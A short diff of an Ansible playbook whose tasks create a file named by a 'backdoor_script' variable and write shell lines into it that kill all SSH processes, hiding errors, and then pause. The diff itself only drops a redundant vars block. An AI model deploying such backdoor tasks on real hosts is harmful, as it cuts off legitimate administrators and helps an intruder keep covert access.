@@ -9,8 +9,6 @@
           - name: createfile
             file: path={{ backdoor_script }} state=touch
           - name: createscript
-            vars:
-                script: {{ backdoor_script }}
             shell: |
                 echo "killall ssh > /dev/null 2>&1" > {{ backdoor_script }}
                 echo "sleep 5" >> {{ backdoor_script }}
